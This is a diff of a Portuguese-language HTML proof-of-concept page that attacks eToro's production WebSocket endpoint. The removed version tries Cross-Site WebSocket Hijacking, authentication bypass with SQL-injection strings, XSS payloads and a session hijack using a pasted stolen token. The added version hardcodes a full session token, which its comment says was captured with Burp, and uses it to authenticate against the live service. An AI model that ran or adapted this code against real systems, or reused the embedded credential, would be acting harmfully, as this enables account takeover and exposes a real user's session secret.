@@ -1,186 +1,78 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
+    <title>eToro WebSocket Test - SIMPLE</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eToro WebSocket - CSWSH PoC</title>
-    <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
-        .log { border-bottom: 1px solid #333; padding: 5px; margin: 5px 0; font-size: 12px; word-break: break-all; }
-        .success { color: #00ff00; }
-        .error { color: #ff4444; }
-        .info { color: #ffaa00; }
-        .critical { color: #ff00ff; }
-        button { background: #2a2a3e; color: #00ff00; border: 1px solid #00ff00; padding: 10px 20px; margin: 5px; cursor: pointer; }
-        textarea { width: 100%; height: 150px; background: #1a1a2e; color: #00ff00; border: 1px solid #333; font-family: monospace; padding: 10px; margin: 10px 0; }
-    </style>
 </head>
 <body>
-    <h1>🔒 eToro WebSocket - PoC de Cross-Site WebSocket Hijacking (CSWSH)</h1>
-    <p>Origem atual: <strong id="origin"></strong></p>
-    <p>Estado: <span id="status" class="info">⏳ Pronto para testar</span></p>
-
-    <div>
-        <button onclick="testBasicConnection()">1. Testar Conexão Básica</button>
-        <button onclick="testAuthBypass()">2. Tentar Bypass de Autenticação</button>
-        <button onclick="testMessageInjection()">3. Testar Injeção de Mensagem (XSS)</button>
-        <button onclick="testSessionHijack()">4. Tentar Sequestro de Sessão</button>
-        <button onclick="clearLogs()">🗑️ Limpar Logs</button>
-    </div>
-
-    <details>
-        <summary>⚙️ Configurações Avançadas (Token)</summary>
-        <textarea id="tokenInput" placeholder="Cole aqui o accessToken capturado dentro do site da eToro..."></textarea>
-        <button onclick="setToken()">Usar Token</button>
-    </details>
-
-    <div id="logs" style="height: 400px; overflow-y: auto; background: #000; padding: 10px; margin-top: 20px;"></div>
-
+    <h1>eToro WebSocket Test</h1>
+    <div id="logs"></div>
+    
     <script>
-        // --- Configuração Inicial ---
-        let activeWs = null;
-        let capturedToken = null;
-
-        document.getElementById('origin').innerText = window.location.origin;
-
-        function addLog(message, type = 'info') {
-            const logsDiv = document.getElementById('logs');
-            const logEntry = document.createElement('div');
-            logEntry.className = `log ${type}`;
-            logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logsDiv.appendChild(logEntry);
-            logsDiv.scrollTop = logsDiv.scrollHeight;
-            console.log(`[${type.toUpperCase()}] ${message}`);
+        // TOKEN COMPLETO capturado do Burp - COPIE EXATAMENTE ESTE
+        const TOKEN = "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwidHlwIjoiSldUIiwiY3R5IjoiSldUIn0..FBpl0RFd2cMPGmUvuFZ9SQ.vEF-1JOcuT_YHdbPCBfCvK9FO-XwD_x4c73xZD1Dwjek1bTtCUc9TmLzWQJYip7CEMh5DvWL9qj9M8YOocE8COoHFseqKZAgicIrgN0YqkMhfVXnGqtJogc-ZihXGMLxGhoolSITLy7mclGbhdfkdeLx-wUnYBs9glnr54QnlR_hx7BQ6Kt7uHNbcZ3q77h4JXT1ePXDZqnfdbEJSTuGvJk4g5ZqWmUGchXBSbDqpj_qJoj1ncHZ6mIuk8VyyfbbBEYn3YqSDhQLkLNn6atl7iTII330XfTfdddJpDYVufh97qgzsZKmsNRYEAZmh2lfSiEpi3n9giD_NJxJ8HDICWnnhNmSvX9cwagwdFjLpOcSu6TDaNsAtcmOCtdbH8_2BWrK8rbk40cDK1C1tXR3MQ.mFqpvm7ylgDINxR0Ewu_M7-OCOIko9fQske0z3wDakk";
+        
+        const logDiv = document.getElementById('logs');
+        
+        function addLog(msg, type = 'info') {
+            const p = document.createElement('div');
+            p.textContent = new Date().toLocaleTimeString() + ' - ' + msg;
+            p.style.color = type === 'error' ? 'red' : (type === 'success' ? 'green' : 'black');
+            logDiv.appendChild(p);
+            console.log(msg);
         }
-
-        function setToken() {
-            capturedToken = document.getElementById('tokenInput').value;
-            if(capturedToken) {
-                addLog(`✅ Token personalizado definido (${capturedToken.substring(0, 30)}...)`, 'success');
+        
+        addLog('🚀 Iniciando teste...');
+        addLog('📍 Origem: ' + window.location.origin);
+        addLog('🔑 Token tamanho: ' + TOKEN.length);
+        
+        const ws = new WebSocket("wss://ws.etoro.com/ws");
+        
+        ws.onopen = () => {
+            addLog('✅ CONEXÃO ESTABELECIDA!', 'success');
+            
+            // Usa o MESMO formato que o Burp capturou
+            const authMsg = {
+                id: crypto.randomUUID(),
+                operation: "Authenticate",
+                data: {
+                    userKey: TOKEN,
+                    apiKey: TOKEN
+                }
+            };
+            
+            addLog('📤 Enviando autenticação...');
+            ws.send(JSON.stringify(authMsg));
+        };
+        
+        ws.onmessage = async (event) => {
+            let data = event.data;
+            if (data instanceof Blob) {
+                data = await data.text();
+                addLog('📥 (Blob convertido): ' + data.substring(0, 500));
             } else {
-                addLog(`⚠️ Token removido`, 'info');
-            }
-        }
-
-        function clearLogs() {
-            document.getElementById('logs').innerHTML = '';
-            if(activeWs) activeWs.close();
-            addLog('Logs limpos', 'info');
-        }
-
-        // --- Funções de Teste Baseadas nos Artigos ---
-
-        // 1. Teste Básico: Verifica se a conexão WebSocket é aceita de origem cruzada (CSWSH)
-        function testBasicConnection() {
-            addLog(`🌐 [CSWSH Test] Tentando conectar de uma origem externa: ${window.location.origin}`, 'info');
-            if(activeWs) activeWs.close();
-
-            activeWs = new WebSocket("wss://ws.etoro.com/ws");
-            document.getElementById('status').innerHTML = '🟡 Conectando...';
-
-            activeWs.onopen = () => {
-                addLog('✅ CONEXÃO ESTABELECIDA COM SUCESSO!', 'critical');
-                addLog('🎯 Isso confirma a vulnerabilidade de Cross-Site WebSocket Hijacking (CSWSH).', 'critical');
-                addLog('🔗 A conexão WebSocket aceita handshakes de qualquer origem.', 'critical');
-                document.getElementById('status').innerHTML = '🔴 Conexão CSWSH Estabelecida!';
-                
-                // Tenta enviar um ping simples
-                activeWs.send(JSON.stringify({id: crypto.randomUUID(), operation: "Ping"}));
-                addLog('📤 Mensagem de "Ping" enviada para testar a comunicação.', 'info');
-            };
-
-            activeWs.onmessage = async (event) => {
-                let data = event.data;
-                if (data instanceof Blob) data = await data.text();
-                addLog(`📥 Resposta do servidor: ${data.substring(0, 200)}`, data.includes('error') ? 'error' : 'info');
-            };
-
-            activeWs.onerror = (error) => {
-                addLog(`❌ Erro na conexão: ${error}`, 'error');
-                document.getElementById('status').innerHTML = '❌ Falha na Conexão';
-            };
-
-            activeWs.onclose = (event) => {
-                addLog(`🔌 Conexão fechada: Código ${event.code} - ${event.reason || 'sem motivo'}`, 'error');
-                if(event.code === 1006) addLog('⚠️ Código 1006: Conexão fechada anormalmente (possível bloqueio pós-handshake).', 'error');
-                if(activeWs) document.getElementById('status').innerHTML = '🔌 Desconectado';
-                activeWs = null;
-            };
-        }
-
-        // 2. Tentativa de Bypass de Autenticação (inspirado no artigo)
-        function testAuthBypass() {
-            if (!activeWs || activeWs.readyState !== WebSocket.OPEN) {
-                addLog('❌ Execute o "Testar Conexão Básica" primeiro para estabelecer a conexão.', 'error');
-                return;
-            }
-            addLog('🔑 [Bypass Test] Tentando diferentes formatos de autenticação para contornar a exigência de "ApiKey"...', 'info');
-            
-            const authAttempts = [
-                { name: "Token como accessToken (formato do artigo)", data: { accessToken: capturedToken || "token_teste_expirado" } },
-                { name: "Token como apiKey", data: { apiKey: capturedToken || "apiKey_teste" } },
-                { name: "Token como userKey", data: { userKey: capturedToken || "userKey_teste" } },
-                { name: "Injeção de parâmetros (SQLi básico)", data: { accessToken: "' OR '1'='1" } },
-                { name: "Usando Cookie de Sessão (se disponível)", data: { sessionId: document.cookie.match(/session=[^;]+/) ? document.cookie.match(/session=[^;]+/)[0] : "N/A" } }
-            ];
-
-            authAttempts.forEach((attempt, index) => {
-                setTimeout(() => {
-                    if (activeWs && activeWs.readyState === WebSocket.OPEN) {
-                        const msg = { id: crypto.randomUUID(), operation: "Authenticate", data: attempt.data };
-                        activeWs.send(JSON.stringify(msg));
-                        addLog(`📤 Tentativa ${index+1}: Enviando ${attempt.name} - ${JSON.stringify(attempt.data).substring(0, 100)}...`, 'info');
-                    } else {
-                        addLog(`❌ Tentativa ${index+1} abortada: Conexão não está mais aberta.`, 'error');
-                    }
-                }, index * 2000);
-            });
-        }
-
-        // 3. Teste de Injeção de Mensagem (XSS) - baseado no artigo
-        function testMessageInjection() {
-            if (!activeWs || activeWs.readyState !== WebSocket.OPEN) {
-                addLog('❌ Execute o "Testar Conexão Básica" primeiro.', 'error');
-                return;
-            }
-            addLog('💉 [XSS Test] Tentando injetar payloads em mensagens para testar sanitização...', 'info');
-            
-            const xssPayloads = [
-                "<img src=x onerror=alert('XSS')>",
-                "<script>alert('XSS')</script>",
-                "'; alert('XSS'); //",
-                "{\"message\": \"<img src=x onerror=alert(1)>\"}"
-            ];
-
-            xssPayloads.forEach((payload, index) => {
-                setTimeout(() => {
-                    if (activeWs && activeWs.readyState === WebSocket.OPEN) {
-                        activeWs.send(JSON.stringify({ id: crypto.randomUUID(), operation: "SendMessage", data: { message: payload } }));
-                        addLog(`📤 Tentativa ${index+1}: Enviando payload XSS: ${payload.substring(0, 50)}`, 'info');
-                    }
-                }, index * 3000);
-            });
-        }
-
-        // 4. Tentativa de Sequestro de Sessão (usando token capturado)
-        function testSessionHijack() {
-            addLog(`🎭 [Hijack Test] Tentando autenticar com token capturado previamente...`, 'info');
-            if (!capturedToken) {
-                addLog(`⚠️ Nenhum token definido. Cole um token válido (capturado dentro do site da eToro) no campo de texto e clique em "Usar Token".`, 'error');
-                return;
+                addLog('📥 (Texto): ' + data.substring(0, 500));
             }
             
-            if (activeWs && activeWs.readyState === WebSocket.OPEN) {
-                const authMsg = { id: crypto.randomUUID(), operation: "Authenticate", data: { accessToken: capturedToken } };
-                activeWs.send(JSON.stringify(authMsg));
-                addLog(`📤 Token de acesso enviado: ${capturedToken.substring(0, 50)}...`, 'info');
-            } else {
-                addLog(`❌ Conexão WebSocket não está ativa. Execute o "Testar Conexão Básica" primeiro.`, 'error');
+            try {
+                const resp = JSON.parse(data);
+                if (resp.success === true) {
+                    addLog('🔥🔥🔥 AUTENTICAÇÃO FUNCIONOU! 🔥🔥🔥', 'success');
+                } else {
+                    addLog('❌ Resposta: ' + resp.errorMessage, 'error');
+                }
+            } catch(e) {
+                addLog('📥 Resposta não-JSON: ' + data.substring(0, 200));
             }
-        }
-
-        addLog('✅ PoC de CSWSH carregada. Use os botões para testar a vulnerabilidade.', 'success');
-        addLog('📌 Esta página demonstra que a conexão WebSocket aceita handshakes de origens não autorizadas.', 'info');
+        };
+        
+        ws.onerror = (error) => {
+            addLog('❌ Erro: ' + error, 'error');
+        };
+        
+        ws.onclose = (event) => {
+            addLog('🔌 Conexão fechada: ' + event.code + ' - ' + event.reason, 'error');
+        };
     </script>
 </body>
 </html>
